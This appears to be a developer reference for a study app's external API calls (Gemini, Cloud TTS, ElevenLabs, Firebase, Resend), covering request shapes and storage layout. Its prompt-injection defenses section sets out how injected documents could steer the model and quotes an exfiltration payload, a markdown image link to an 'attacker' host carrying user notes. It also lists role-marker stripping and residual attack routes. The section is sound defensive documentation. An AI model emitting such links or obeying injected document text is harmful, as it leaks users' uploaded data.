# API Integrations

Reference for every external API this app calls: where the integration lives in code,
exactly what prompt/request is sent, and the input/output shape. All backend code lives under
`api/study_app/` (`api/index.py` is just the Vercel entry point that re-exports the FastAPI
app); all frontend call sites are in `src/App.jsx` unless noted.

For deployment/env-var setup, see [README.md](README.md). This file is about *what* is
sent to each API and *where* in the code, not how to configure keys.

---

## 1. Google Gemini (`generativelanguage.googleapis.com`)

Gemini is used for study-content generation, Tutor chat, per-section regeneration
(quiz/summary/podcast), and — opt-in via `TTS_PROVIDER=gemini` — podcast
**text-to-speech** (§2.2; the default TTS is Google Cloud Text-to-Speech, §2.1).

- Base URL: `GEMINI_API_BASE` env var, default `https://generativelanguage.googleapis.com/v1beta`
- Model (text): `GEMINI_MODEL` env var, default `gemini-2.5-flash` (`api/study_app/config.py`)
- Auth: `x-goog-api-key` header, key from `GEMINI_API_KEY` (or `GOOGLE_API_KEY`)
- Shared text transport: `call_gemini()` — `api/study_app/gemini_client.py`

### 1.1 Shared transport — `call_gemini()`

**File/line:** `api/study_app/gemini_client.py`

**Request built** (`api/study_app/gemini_client.py`):

```json
POST {GEMINI_API_BASE}/models/{GEMINI_MODEL}:generateContent
Header: x-goog-api-key: <GEMINI_API_KEY>

{
  "systemInstruction": { "parts": [{ "text": "<system_instruction>" }] },
  "contents": [ { "role": "user" | "model", "parts": [{ "text": "..." }] }, ... ],
  "generationConfig": {
    "temperature": 0.3, "topP": 0.9, "maxOutputTokens": 16384,
    "responseMimeType": "application/json"   // only when json_response=True
  }
}
```

Response parsed at `api/study_app/gemini_client.py`. Raises `HTTPException(502)` on non-200,
unexpected shape, or empty completion.

### 1.2 Shared style/length guidance

`PODCAST_STYLE_GUIDANCE` (`api/study_app/study_prompts.py`) and `SUMMARY_LENGTH_GUIDANCE`
(`api/study_app/study_prompts.py`) back both the combined analysis prompt and the standalone regenerate
prompts, so a chosen style/length reads consistently either way.

- **Podcast styles** `{"conversation", "solo", "interview"}` — two-host banter / single narrator / host+expert-guest. Invalid → `conversation`.
- **Summary lengths** `{"concise", "detailed"}` — 4–6 vs 8–12 key points. Invalid → `concise`.
- Optional `focus` (≤200 chars) appends `Focus specifically on this topic … skip parts of the document unrelated to it.`
- **Podcast script length cap:** both podcast prompts explicitly instruct Gemini to keep
  the *combined spoken text of all segments* under `MAX_PODCAST_SCRIPT_CHARS` = 4,500
  characters (`api/study_app/config.py`) — see §1.3/§1.7 for the prompt wording and §1.8 for the
  server-side enforcement, since an LLM asked for a character budget won't always hit it
  exactly.

### 1.3 Study analysis (`POST /api/pdf/analyze`)

**Handler:** `api/study_app/routes/pdf_routes.py` · **Frontend:** `src/App.jsx:329`

Multipart form: `files: list[UploadFile]` — repeat the `files` field once per file, 1–5 files,
≤4 MB combined (`read_uploads()` at `api/study_app/pdf_processing.py`), any mix of PDFs and
JPEG/PNG/WEBP/HEIC images — plus optional `podcast_style` / `summary_length` / `summary_focus`
Form fields and the `Authorization` header.

**Prompt** built by `build_study_system_instruction()` (`api/study_app/study_prompts.py`) — a single
JSON-shaped instruction producing `title` + `summary` + `quiz` + `podcastScript` + `flashcards`
(+ `imageNotes` when any image sources are present — see §1.9 for how `flashcards` is parsed/
persisted), with the summary/podcast guidance lines swapped in from §1.2, including the line:

```
Keep the combined spoken text of all podcast segments under 4500 characters total — write shorter, punchier lines rather than fewer segments.
```

**User content** — one multimodal turn: a leading text part with the file names and every PDF
source's extracted text (concatenated, each under an `=== Source: {name} ===` header, combined
truncated to `MAX_GEMINI_CONTEXT_CHARS` = 400,000 chars, `api/study_app/config.py`), then one
`{"text": "=== Source: {name} (image) ==="}` + `{"inlineData": {"mimeType", "data": base64}}`
pair per image — Gemini reads the image bytes directly, no OCR step:

```
Source file names: notes.pdf, photo.jpg

Extracted text content:

=== Source: notes.pdf ===
{pdf text}

2 image source(s) follow as attachments.
```
```
=== Source: photo.jpg (image) ===
<inlineData: image/jpeg, base64>
```

Called at `api/study_app/routes/pdf_routes.py`. Normalised by `normalise_study_content()`
(`api/study_app/study_parsing.py`) via `parse_summary_points()` (`api/study_app/study_parsing.py`),
`parse_quiz_questions()` (`api/study_app/study_parsing.py`), `parse_podcast_script()` (`api/study_app/study_parsing.py`,
see §1.8 for the character-cap enforcement). When images were sent, `parse_image_notes()`
(`api/study_app/study_parsing.py`) pulls Gemini's own transcription of each image out of the
response and folds it into the text that gets stored/returned as `document_context` — raw image
bytes are never stored or re-sent, so this transcription is the only record later text-only
calls (tutor chat, regenerate-*) have of an image's content.

**Output — `StudyAnalysisResponse`, `api/study_app/models.py`:**

```json
{
  "file_name": "string (one name, or \"first.pdf +2 more\")", "file_names": ["string"],
  "page_count": 0, "title": "string",
  "summary": ["string"],
  "quiz": [ { "q": "string", "options": ["string"], "answer": 0, "topic": "string", "explanation": "string" } ],
  "podcast": { "duration": "10:00", "hosts": ["name"], "transcript": [ { "t": "0:00", "who": "name", "line": "string" } ] },
  "document_context": "string (extracted PDF text + Gemini's image transcriptions, combined)",
  "document_id": "string | null"
}
```

### 1.4 Tutor chat (`POST /api/chat`)

**Handler:** `api/study_app/routes/chat.py` · **Frontend:** `src/App.jsx:1318` (`TutorPanel.send()`)

Per-request system prompt: *"You are a friendly study tutor. Answer questions using ONLY
the uploaded document below…"* + file name + document context. Last 20 turns passed as
`contents`; called plain-text (`json_response=False`).

**Input — `ChatRequest`, `api/study_app/models.py`** · **Output — `ChatResponse`, `api/study_app/models.py`** (`{ "answer": "string" }`).

### 1.5 Quiz regeneration (`POST /api/documents/{doc_id}/quiz/regenerate`)

**Handler:** `api/study_app/routes/quiz.py` · **Frontend:** `src/App.jsx:801`

Prompt `QUIZ_SYSTEM_INSTRUCTION` (`api/study_app/study_prompts.py`). Avoid-list = current quiz + last 5
attempts' questions, capped at `MAX_AVOID_QUESTIONS` = 30 (`api/study_app/config.py`). Overwrites
stored `quiz`. Output `QuizRegenerateResponse` (`api/study_app/models.py`).

### 1.6 Summary regeneration (`POST /api/documents/{doc_id}/summary/regenerate`)

**Handler:** `api/study_app/routes/summary.py` · **Frontend:** `src/App.jsx:656`

Prompt `build_summary_system_instruction()` (`api/study_app/study_prompts.py`). Overwrites stored
`summary`. Input `SummaryRegenerateRequest` (`api/study_app/models.py`, `{length, focus}`),
output `SummaryRegenerateResponse` (`api/study_app/models.py`).

### 1.7 Podcast style switch / regeneration (`POST /api/documents/{doc_id}/podcast/regenerate`)

**Handler:** `api/study_app/routes/podcast.py` · **Frontend:** `src/App.jsx` (`regenerateScript`)

**Every generated style version is kept.** The parent document stores `podcast_style`
(active style) and `podcast_versions` (`{style: script + audio_ns}`), and cached audio is
namespaced per style (§4), so switching styles never destroys the other version's script
or audio:

- **Requested style already saved** → the endpoint loads it from `podcast_versions`,
  makes it active, and returns `reused: true` — **no Gemini call, no usage charged, its
  cached audio untouched**. The UI shows those chips with a history icon instead of the
  AI sparkle, and restores the AI player immediately if that version's audio is fully
  cached.
- **Requested style never generated** → calls Gemini with
  `build_podcast_system_instruction()` (`api/study_app/study_prompts.py`) — same style guidance and
  `MAX_PODCAST_SCRIPT_CHARS` budget as §1.3 — saves the new version, makes it active, and
  clears only that style's own audio namespace (other styles keep theirs).
- **Pre-versioning documents** are migrated on first touch: the existing script is adopted
  as the saved version of its guessed style (`_guess_podcast_style()`, host count) with
  `audio_ns: "legacy"`, so audio cached under the old integer IDs stays reachable.

Input `PodcastRegenerateRequest` (`api/study_app/models.py`, `{style}`), output
`PodcastRegenerateResponse` (`api/study_app/models.py`,
`{podcast, podcast_style, saved_styles, reused}`). `saved_styles` also comes back from
`POST /api/pdf/analyze` and `GET /api/documents/{doc_id}` so the UI can mark chips on load.

### 1.8 Podcast script length enforcement — `parse_podcast_script()`

**File/line:** `api/study_app/study_parsing.py` (shared by §1.3 and §1.7 — both the initial analysis
and every regeneration go through this same parser).

The prompt (§1.2) asks Gemini to stay under `MAX_PODCAST_SCRIPT_CHARS` = 4,500 characters
of combined spoken text, but LLMs don't reliably self-count characters, so it's enforced
here regardless of what Gemini actually returns:

- Segments are added one at a time, tracking the running total of `line` text length.
- Once the next segment would push the running total over the cap, it's **dropped**
  (along with any segments after it) rather than truncated mid-sentence.
- The one exception: if a *single* segment's line alone exceeds the remaining budget
  (e.g. the very first segment is unusually long), that line is truncated to fit rather
  than dropped outright — so one long line can't zero out an otherwise-good script.
- The cap applies to spoken `line` text only, not timestamps/speaker names.

Verified against the real `/api/pdf/analyze` and `.../podcast/regenerate` endpoints with a
mocked 30-segment Gemini response that ignored the prompt entirely: the persisted script
(both the API response and what's written to Firestore) stayed at exactly the 4,500-char
cap, and quiz/summary parsing were unaffected.

### 1.9 Flashcards (`GET /api/documents/{doc_id}/flashcards`, `POST …/flashcards/regenerate`)

**Handlers:** `api/study_app/routes/flashcards.py` (list, storage only) and `api/study_app/routes/flashcards.py` (generate) ·
**Frontend:** `src/App.jsx` (`FlashcardsPanel`, the "Cards" tab).

**A first set is generated by default**, in the same Gemini call as summary/quiz/podcast:
`build_study_system_instruction()` (§1.2/1.3) asks for a `flashcards` block alongside them,
parsed by `normalise_study_content()` → `parse_flashcards()`, and saved via `save_flashcard_set()`
right after the document is created in `analyze_pdf()`. Unlike summary/quiz/podcast, a missing
or malformed `flashcards` block does NOT fail the analysis (no 502) — the Flashcards tab's
existing "Generate flashcards" button is the fallback, so analysis stays resilient to Gemini
occasionally skipping the block. This is a single combined call (no extra usage charge or
latency), not a second Gemini call after the fact.

Regeneration from the tab reuses `FLASHCARD_SYSTEM_INSTRUCTION` (`api/study_app/study_prompts.py`),
asking for EXACTLY `FLASHCARDS_PER_SET` = 6 cards (`api/study_app/config.py`) as
`{"cards": [{"front", "back"}]}`, grounded in the document. Parsed/enforced by
`parse_flashcards()` (`api/study_app/study_parsing.py`): trimmed to 6, fronts capped at 120
chars and backs at 400, fewer than 3 usable cards → 502 (only for an explicit regenerate call —
the initial-analysis path never raises on this, per above).

**Generating a new set never deletes the old ones.** Each set is saved as its own document
under `flashcard_sets/{auto_id}` (`save_flashcard_set()`, `api/study_app/storage/flashcard_sets.py`), newest first
in the list endpoint, bounded to `MAX_FLASHCARD_SETS` = 10 (`api/study_app/config.py`, oldest
trimmed). The regenerate prompt carries an avoid-list of up to `MAX_AVOID_CARDS` = 30
recent card fronts (same pattern as quiz §1.5) so a new set covers different ground. The
UI's set picker switches between saved sets locally — no API call. Generation counts 1
usage unit; listing is free.

---

## 2. Podcast text-to-speech — free browser voice (default player) or paid AI narration

**The default podcast player calls no external API at all.** It uses the browser's
built-in Web Speech API (`window.speechSynthesis`) entirely client-side —
`pickBrowserVoices()` (`src/App.jsx:937`) and the playback functions in `PodcastPanel`
(`src/App.jsx:1006-1049`). Free, instant, no quota, works offline. This is what's shown
first in the UI ("Play episode").

A separate, explicitly opt-in **"Generate AI-narrated audio"** button (never triggered
automatically — it's a paid/quota-limited call) uses the backend endpoint below.

**Backend AI narration — Google Cloud TTS (default), Gemini TTS or ElevenLabs**

Each podcast transcript line is synthesised to audio. The backend is selected by
**`TTS_PROVIDER`** (`api/study_app/config.py`), default **`google`** (Cloud Text-to-Speech —
synthesizes the whole episode in ONE fast call); `gemini` and `elevenlabs` remain fully
selectable. All three paths live in the code; only the selected one runs. Dispatch is in
the segment-audio handler (`api/study_app/routes/podcast.py`).

**Endpoint:** `POST /api/podcast/segment-audio` — handler at `api/study_app/routes/podcast.py`
**Frontend call site:** `src/App.jsx` (`PodcastPanel`'s `ensureSegmentUrl()`, only called
once the user taps "Generate AI-narrated audio"). `generateAudioFor` fetches segments
**strictly sequentially** — a cache miss generates a whole batch server-side, so two
concurrent misses would each fire an expensive batch call and trip the free tier's
3-requests/minute limit. Fetches go through `fetchSegmentWithRecovery()`: a batch request
can sit minutes with nothing on the wire and mobile networks/proxies kill idle connections,
but the serverless function keeps running and caches the batch anyway — so on a network
drop or gateway 5xx the frontend polls `GET /api/podcast/audio-status/{doc_id}` (free; also reports `episode_cached` for the single-track episode)
until the segment appears cached, then re-requests it as an instant cache hit; it only
re-generates if the segment never appears (3 attempts total, non-5xx HTTP errors thrown
immediately). The frontend is provider-agnostic: it reads `res.blob()` and plays it, so WAV
or MP3 both work.

A cache check runs first (`api/study_app/routes/podcast.py`): if `document_id` + `segment_index` are given
and that segment was already generated, the stored bytes are returned with their stored MIME
(no TTS call). See §4.

**Document-tied requests generate MANY segments per call, not one.** When a request
carries a `document_id` + `segment_index` (i.e. it's tied to a saved document, not an
ad-hoc preview), the handler (`api/study_app/routes/podcast.py`) fetches that document's full
transcript from Firestore, generates in bulk, caches every resulting segment via
`save_segment_audio()` and calls `increment_usage()` once:

- **google (default):** `google_tts_episode()` synthesizes the ENTIRE episode in one Cloud
  TTS call (§2.1). Cloud TTS is a dedicated speech engine, not an LLM — a full 4,500-char
  script takes seconds, nowhere near the serverless deadline.
- **gemini:** `gemini_tts_batch()` generates the ~2,250-char batch around the requested
  segment (§2.2). Two earlier Gemini designs failed in production: one-call-per-segment
  burned the free tier's 3-requests/minute limit (429s) and one-call-per-episode timed out,
  since Gemini synthesizes roughly in real time (504s). `GEMINI_TTS_BATCH_CHARS` = 2,250
  (`api/study_app/config.py`) keeps each call inside `maxDuration: 300` (`vercel.json`), with
  `GEMINI_TTS_TIMEOUT_SECONDS` = 280s (`api/study_app/config.py`).

If there's no matching document/transcript (e.g. an ad-hoc single-line preview), the
handler falls back to a single-segment call (`api/study_app/routes/podcast.py`). The ElevenLabs path
(§2.3) is unchanged — always one call per segment.

Shared plumbing for both bulk paths: the combined PCM is sliced into one WAV clip per
segment by `_split_pcm_by_chars()` (`api/study_app/tts/pcm.py`) — boundaries proportional to
each segment's character share (a heuristic; neither API returns per-segment timing),
aligned to whole 16-bit samples. Sliced segments can exceed one Firestore document, so
cached audio is **chunked**: `save_segment_audio()` (`api/study_app/storage/audio_cache.py`) splits anything
over `MAX_CACHED_AUDIO_BYTES` = 740,000 raw bytes (`api/study_app/config.py`) across sibling chunk
documents (`_audio_chunk_ref()`, `api/study_app/storage/audio_cache.py`) and `get_cached_segment_audio()`
(`api/study_app/storage/audio_cache.py`) reassembles them; a missing chunk reads as a cache miss.

### 2.1 Google Cloud Text-to-Speech (default) — one continuous episode track

- Base URL: `GOOGLE_TTS_API_BASE`, default `https://texttospeech.googleapis.com/v1` (`api/study_app/config.py`)
- Auth: `x-goog-api-key` header — `GOOGLE_TTS_API_KEY`, falling back to `GEMINI_API_KEY` (`get_google_tts_api_key()`, `api/study_app/config.py`). **The Cloud Text-to-Speech API must be enabled on the key's Google Cloud project** (the 403 error message links to the enable page). Pricing: Neural2 $16/1M chars, WaveNet $4/1M, ~1M free chars/month.
- Voice: `GOOGLE_TTS_VOICE`, default `en-US-Neural2-F` (`api/study_app/config.py`); `languageCode` derived from the voice name. **One narrator voice for the whole episode** — Neural2/WaveNet voices have no multi-speaker mode, so both hosts share it; speaker names are never included in the synthesized text.

**Preferred flow — `POST /api/podcast/episode-audio`** (`{document_id}`): returns the WHOLE
episode as **one continuous MP3 track** (`google_tts_episode_track()`, one synthesize call
with `audioEncoding: "MP3"` — ~1.2 MB for 5 minutes, inside Vercel's response-body limit,
unlike a ~14 MB WAV). Cached under the `{style}.full` sentinel document (chunked, §4);
cache hits are free. Non-google providers return 404, telling the frontend to use the
per-segment flow instead. The frontend plays it as a single `<audio>` element: real
seeking, no gaps, transcript highlight/taps mapped through char-proportional time offsets.

```json
POST {GOOGLE_TTS_API_BASE}/text:synthesize
Header: x-goog-api-key: <key>

{
  "input":       { "text": "<all segment lines joined with blank lines>" },
  "voice":       { "languageCode": "en-US", "name": "en-US-Neural2-F" },
  "audioConfig": { "audioEncoding": "MP3", "sampleRateHertz": 24000 }
}
```

The per-segment path (used by `/api/podcast/segment-audio` for this provider) requests
`LINEAR16` instead, parses the WAV via `_parse_wav()`, slices per segment and re-wraps with
`pcm_to_wav()` (**output** `audio/wav`). Cloud TTS caps input at 5,000 bytes; the
4,500-char script cap fits one call, and `_episode_text_slices()` packs segments under a
defensive `GOOGLE_TTS_MAX_INPUT_BYTES` = 4,800 budget (`api/study_app/config.py`) — multi-byte
punctuation can force a rare second call (MP3 parts are concatenated). Shared transport
`_google_tts_request()`; `google_tts()` handles ad-hoc single segments. Timeout
`GOOGLE_TTS_TIMEOUT_SECONDS` = 55s (`api/study_app/config.py`) — synthesis takes seconds.

### 2.2 Gemini TTS (opt-in, `TTS_PROVIDER=gemini`) — `gemini_tts()`, `api/study_app/tts/gemini_tts.py`

- Model: `GEMINI_TTS_MODEL` env var, default `gemini-2.5-flash-preview-tts` (`api/study_app/config.py`)
- Voices: `GEMINI_TTS_VOICE_A` / `GEMINI_TTS_VOICE_B`, default `Kore` / `Puck` (`api/study_app/config.py`), chosen by `request.speaker` (0/1)
- Auth: `x-goog-api-key` header, reuses `GEMINI_API_KEY`
- Batch generation: `_tts_batch_bounds()` (`api/study_app/tts/gemini_tts.py`) groups consecutive
  segments into ≤`GEMINI_TTS_BATCH_CHARS` batches; `gemini_tts_batch()`
  (`api/study_app/tts/gemini_tts.py`) builds one "SpeakerName: line" block per batch and uses
  `multiSpeakerVoiceConfig` when two hosts speak (labels are a synthesis directive, not
  spoken aloud), plain `voiceConfig` for solo narration.

```json
POST {GEMINI_API_BASE}/models/{GEMINI_TTS_MODEL}:generateContent
Header: x-goog-api-key: <GEMINI_API_KEY>

{
  "contents": [{ "parts": [{ "text": "<one transcript line>" }] }],
  "generationConfig": {
    "responseModalities": ["AUDIO"],
    "speechConfig": { "voiceConfig": { "prebuiltVoiceConfig": { "voiceName": "Kore" } } }
  }
}
```

Response carries base64 PCM in `candidates[0].content.parts[0].inlineData`
(`mimeType` like `audio/L16;codec=pcm;rate=24000`). Gemini returns raw 16-bit PCM, which
browsers can't play directly, so `pcm_to_wav()` (`api/study_app/tts/pcm.py`) wraps it in a WAV
header (sample rate parsed from the mimeType). **Output:** `audio/wav` bytes.

### 2.3 ElevenLabs (opt-in, `TTS_PROVIDER=elevenlabs`) — `elevenlabs_tts()`, `api/study_app/tts/elevenlabs.py`

- Base URL: `ELEVENLABS_API_BASE`, default `https://api.elevenlabs.io/v1`; model `ELEVENLABS_MODEL`, default `eleven_multilingual_v2`
- Auth: `xi-api-key` header, key from `ELEVENLABS_API_KEY`
- Voices resolved from the account via `resolve_voice_ids()` (`api/study_app/tts/elevenlabs.py`; avoids the free-tier 402 on library voices), cached in-process (`_cached_voice_ids`, `api/study_app/tts/elevenlabs.py`); `ELEVENLABS_VOICE_HOST_A/B` override when both set

```
POST {ELEVENLABS_API_BASE}/text-to-speech/{voice_id}?output_format=mp3_44100_128
Header: xi-api-key: <ELEVENLABS_API_KEY>

{ "text": "<line, ≤1000 chars — MAX_SEGMENT_TEXT_CHARS, api/study_app/config.py>",
  "model_id": "eleven_multilingual_v2",
  "voice_settings": { "stability": 0.5, "similarity_boost": 0.75 } }
```

**Output:** `audio/mpeg` bytes.

**Input to the endpoint — `SegmentAudioRequest`, `api/study_app/models.py`:**

```json
{ "text": "string", "speaker": 0, "document_id": "string | null", "segment_index": 0 }
```

---

## 3. Firebase Authentication

Gates uploading, chat, regeneration and podcast audio behind sign-in; identifies the user
for storage and usage limits.

- **Backend:** `require_user()` (`api/study_app/auth.py`) — FastAPI dependency (`Depends(require_user)`). Reads `Authorization: Bearer <idToken>`, verifies via `firebase_auth.verify_id_token()`, enforces the `ALLOWED_EMAILS` allowlist (403), returns `AuthedUser {uid, email}` (`api/study_app/models.py`). Admin init: `get_firebase_app()` (`api/study_app/firebase_client.py`).
- **Frontend:** `src/firebase.js` inits the client SDK. Sign-in `signInWithEmailAndPassword` (`src/App.jsx:138`); session watch `onAuthStateChanged` (`src/App.jsx:204`); `authedFetch()` (`src/App.jsx:206`) attaches `auth.currentUser.getIdToken()` (`src/App.jsx:207`) as a Bearer token on every call.

---

## 4. Firebase Firestore (Admin SDK)

Storage only — no LLM/TTS cost (the regenerate endpoints do call Gemini, but that cost is
the Gemini call, not the Firestore write). Client: `get_firestore_client()`
(`api/study_app/firebase_client.py`). Layout under `users/{uid}/documents/{doc_id}`:

| Path | Written by | File/line | Contents |
|---|---|---|---|
| `documents/{doc_id}` | `analyze_pdf()` | `api/study_app/routes/pdf_routes.py` | `title`, `file_name` (joined summary), `file_names` (one entry per uploaded source), `summary`, `quiz`, `podcast` (active script), `podcast_style` (active style), `podcast_versions` (`{style: script + audio_ns}` — every generated style version, ≤4,500 chars each, reused on style switch per §1.7), `document_context` (PDF text + image transcriptions combined, ≤`MAX_STORED_CONTEXT_BYTES` = 900 KB, `api/study_app/config.py`), `created_at`. `summary`/`quiz` are overwritten in place by §1.5–1.6 |
| `documents/{doc_id}/audio/{style}.{segment_index}` | `save_segment_audio()` | `api/study_app/storage/audio_cache.py` | `{ "data": "<base64 audio>", "mime": "audio/wav" \| "audio/mpeg", "chunks": N }` — one doc per segment plus a `{style}.full` sentinel doc holding the single continuous MP3 episode track (§2.1), **namespaced per podcast style** (`_audio_doc_id()`, `api/study_app/storage/audio_cache.py`) so every generated style keeps its own audio; pre-versioning audio lives under plain integer IDs (the `"legacy"` namespace, still served). Audio over `MAX_CACHED_AUDIO_BYTES` = 740 KB raw (`api/study_app/config.py`) is split across sibling chunk docs `….c{n}` (`{ "data": ... }` only) and reassembled on read by `get_cached_segment_audio()` (`api/study_app/storage/audio_cache.py`); a missing chunk reads as a cache miss. Fresh regeneration of a style clears only that style's namespace (§1.7); document deletion drops the whole subcollection |
| `documents/{doc_id}/chat/log` | `save_chat_log()` | `api/study_app/routes/chat.py` | `{ "messages": [...] }` — last `MAX_STORED_CHAT_MESSAGES` = 60, each text ≤`MAX_STORED_CHAT_TEXT_BYTES` = 10 KB (`api/study_app/config.py`) |
| `documents/{doc_id}/quiz_attempts/{auto_id}` | `save_quiz_attempt()` | `api/study_app/storage/quiz_attempts.py` | `{ questions, answers, score, total, created_at }` — score computed server-side; capped at `MAX_QUIZ_ATTEMPTS` = 20 (`api/study_app/config.py`) |
| `documents/{doc_id}/flashcard_sets/{auto_id}` | `save_flashcard_set()` | `api/study_app/storage/flashcard_sets.py` | `{ cards: [{front, back}], created_at }` — one document per generated set of 6 cards; every set is kept (newest first), capped at `MAX_FLASHCARD_SETS` = 10 (`api/study_app/config.py`). Deleted with the document |
| `feedback/{auto_id}` | `submit_feedback()` | `api/study_app/routes/profile.py` | `{ uid, email, rating (1-5), comment (≤2,000 chars), context (≤100 chars), created_at }` — one document per "Give feedback" submission (§5). **Top-level collection, not under `users/{uid}`** — it's an app-wide feedback log for the maintainer, so it's unaffected by a user deleting their own documents/history |
| `usage/{yyyy-mm-dd}` | `increment_usage()` | `api/study_app/storage/usage.py` | `{ count, date }` — shared daily counter across analyze/chat/quiz-/summary-/podcast-regenerate/audio-generate |

Reads: `list_documents()` (`api/study_app/routes/documents.py`), `get_document()` (`api/study_app/routes/documents.py`),
`get_cached_segment_audio()` (`api/study_app/storage/audio_cache.py`, returns bytes + MIME; legacy docs without
`mime` default to `audio/mpeg`), `list_cached_segment_indices()` (`api/study_app/storage/audio_cache.py`),
`get_chat_log()` (`api/study_app/routes/chat.py`), `list_quiz_attempts()` (`api/study_app/storage/quiz_attempts.py`).
Deletes cascade to `audio`/`chat`/`quiz_attempts`/`flashcard_sets` via
`_delete_document_and_subcollections()` (`api/study_app/storage/documents.py`). Two small shared helpers
back the regenerate endpoints: `_get_document_or_404()` (`api/study_app/storage/documents.py`) and
`_require_document_context()` (`api/study_app/storage/documents.py`).

---

## 5. Resend (`api.resend.com`) — feedback email notifications

Optional, best-effort. `POST /api/feedback` (`api/study_app/routes/profile.py`) always saves the
submission to Firestore (§4) regardless of whether this is configured; the email is a
"nice to have" on top, never a dependency the request can fail on.

- Auth: `Authorization: Bearer <RESEND_API_KEY>` (`api/study_app/config.py`) — unset means the
  feature is off entirely, `send_feedback_email()` returns `False` immediately without
  making a request (`api/study_app/notifications.py`).
- Destination: `FEEDBACK_EMAIL_TO` (`api/study_app/config.py`) — also required, or email is skipped.
- Sender: `FEEDBACK_EMAIL_FROM` (`api/study_app/config.py`), defaults to Resend's shared sandbox
  address (`onboarding@resend.dev`), which works without verifying a domain but is rate/
  reputation-limited — set a verified sender for real usage.

```json
POST https://api.resend.com/emails
Header: Authorization: Bearer <RESEND_API_KEY>

{
  "from": "Syrora Feedback <onboarding@resend.dev>",
  "to": ["you@example.com"],
  "subject": "Syrora feedback: ★★★★☆ (4/5)",
  "text": "Rating: ★★★★☆ (4/5)\nFrom: learner@example.com\nScreen: podcast\n\n<comment text>"
}
```

Any non-2xx response or a network error is caught and treated as `emailed: false`
(`api/study_app/notifications.py`) — `submit_feedback()` never raises because of the email step,
it only reports back whether the email attempt succeeded.

---

## 6. Prompt-injection defenses — `api/study_app/prompt_safety.py`

Attacker-reachable text that ends up inside a Gemini prompt: the summary "focus" topic, every
uploaded file's name (persisted and reused in later prompts), client-posted quiz attempts (their
question text feeds the regenerate-quiz avoid-list), prior flashcard fronts, chat
`question`/`history`/`file_name`/`document_context` (all client-supplied on every call), and
document content itself (PDF text, or Gemini's `imageNotes` transcription of an image, §1.3).

**`sanitize_label(text, max_chars)`** — for every short label: NFKC-normalizes first (so
fullwidth `＜`/`＂`/`ＳＹＳＴＥＭ：` fold to ASCII before checking), turns control characters into
spaces, removes format/invisible characters (zero-width spaces/joiners, bidi overrides, BOM),
strips quotes, angle brackets and their Unicode lookalikes (`‹ › « » 〈 〉 ≪ ≫` …), collapses to one
line, then repeatedly strips `system:`/`assistant:`/`user:`/`model:`/`developer:` role markers until
none remain. Applied to the focus topic (`_summary_instruction_line()`), file names (once at upload
in `read_uploads()`, again defensively wherever a stored name is read back), and — via
`format_untrusted_list()` — every avoid-list item in quiz/flashcard regeneration.

**Nonce-delimited framing** — `frame_untrusted_document()` wraps document content between
`<<<BEGIN UNTRUSTED DOCUMENT {nonce}>>>` / `<<<END UNTRUSTED DOCUMENT {nonce}>>>`, where the nonce is
16 random hex chars generated per Gemini call and never returned to a client — content written
before the call can't forge the real end marker. Tag-shaped text inside the content (`</document>`,
`</document >`, `＜/document＞`, `<<<` fake markers) is also visibly neutralized. The focus topic is
framed the same way (`frame_untrusted_label()`); since a sanitized label can't contain `<`, it can't
contain a marker at all. Stored `document_context` stays un-framed so framing is never nested.

**Bounds** — chat `question` ≤ `MAX_CHAT_QUESTION_CHARS` (4,000), each history turn ≤
`MAX_CHAT_TURN_CHARS` (8,000), last 20 turns only; history always goes into user/model content turns,
never the systemInstruction, whatever role the client claims. Quiz attempts: ≤
`MAX_QUIZ_ATTEMPT_QUESTIONS` (20) questions (else 400), text fields truncated before storage.

**Output rendering** — the frontend's markdown renderer (`src/App.jsx`, `markdownComponents`)
renders images as alt text only. Otherwise an injected document could make the model emit
`![](https://attacker/?d=<notes>)` and the browser would fetch it — zero-click exfiltration (e.g. of
another file uploaded in the same multi-file request). Raw HTML is already escaped and `javascript:`
links already blocked by react-markdown's defaults.

**Regression tests** — `tests/test_prompt_injection.py` (stdlib `unittest`, run
`python -m unittest discover -s tests -v` from the repo root) covers each of the above with hostile
payloads, plus route-level checks of what each endpoint actually sends to Gemini.

**Residual risk, stated plainly:** these tests check what the server *sends*; they can't prove how a
model responds. A sufficiently adversarial uploaded document can still try to steer the model, since
its real text must reach it — framing lowers the odds, nothing removes them. Chat history is
client-supplied (the server is stateless), so a user can forge earlier "model" turns — but only in
their own session. Impact is contained: no secrets live in any prompt (API keys travel in headers),
and every user's data is isolated under their own Firestore path, so there's no cross-user channel.
Homoglyph role markers (e.g. Cyrillic `ѕуѕtеm:`) aren't stripped, but stay confined inside a framed
block.

---

## Internal REST API

| Method | Path | Auth | Handler | External API |
|---|---|---|---|---|
| GET | `/api/health` | none | `api/study_app/routes/health.py` | — (public liveness only: `status`, `service`, `browser_voice_enabled`) |
| GET | `/api/status` | required | `api/study_app/routes/health.py` | — (authed config status: providers keyed, `tts_provider`, `access_restricted`, `daily_usage_limit`) |
| GET | `/api/profile` | required | `api/study_app/routes/profile.py` | Firestore |
| POST | `/api/feedback` | required | `api/study_app/routes/profile.py` | Firestore, Resend (§5, best-effort) |
| GET | `/api/documents` | required | `api/study_app/routes/documents.py` | Firestore |
| GET | `/api/documents/{doc_id}` | required | `api/study_app/routes/documents.py` | Firestore |
| DELETE | `/api/documents/{doc_id}` | required | `api/study_app/routes/documents.py` | Firestore |
| DELETE | `/api/documents` | required | `api/study_app/routes/documents.py` | Firestore |
| POST | `/api/pdf/prepare` | required | `api/study_app/routes/pdf_routes.py` | — |
| POST | `/api/pdf/analyze` | required | `api/study_app/routes/pdf_routes.py` | Gemini, Firestore |
| POST | `/api/chat` | required | `api/study_app/routes/chat.py` | Gemini |
| GET | `/api/documents/{doc_id}/chat` | required | `api/study_app/routes/chat.py` | Firestore |
| PUT | `/api/documents/{doc_id}/chat` | required | `api/study_app/routes/chat.py` | Firestore |
| GET | `/api/documents/{doc_id}/quiz/attempts` | required | `api/study_app/routes/quiz.py` | Firestore |
| POST | `/api/documents/{doc_id}/quiz/attempts` | required | `api/study_app/routes/quiz.py` | Firestore |
| POST | `/api/documents/{doc_id}/quiz/regenerate` | required | `api/study_app/routes/quiz.py` | Gemini, Firestore |
| GET | `/api/documents/{doc_id}/flashcards` | required | `api/study_app/routes/flashcards.py` | Firestore |
| POST | `/api/documents/{doc_id}/flashcards/regenerate` | required | `api/study_app/routes/flashcards.py` | Gemini, Firestore |
| POST | `/api/documents/{doc_id}/summary/regenerate` | required | `api/study_app/routes/summary.py` | Gemini, Firestore |
| POST | `/api/documents/{doc_id}/podcast/regenerate` | required | `api/study_app/routes/podcast.py` | Gemini, Firestore |
